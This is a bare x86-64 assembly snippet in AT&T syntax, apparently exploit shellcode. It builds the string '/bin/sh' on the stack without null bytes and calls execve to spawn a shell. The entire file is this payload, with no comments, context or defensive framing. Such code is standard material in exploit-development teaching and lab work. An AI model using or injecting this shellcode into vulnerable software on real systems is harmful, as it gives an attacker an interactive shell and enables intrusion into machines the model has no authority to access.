.section .text
.global _start
_start:
    xorq %rax, %rax
    pushq %rax
    movq $0x68732f6e69622f2f, %rdi
    shrq $8, %rdi
    pushq %rdi

    movq %rsp, %rdi
    xorq %rsi, %rsi
    xorq %rdx, %rdx

    movq $59, %rax
    syscall
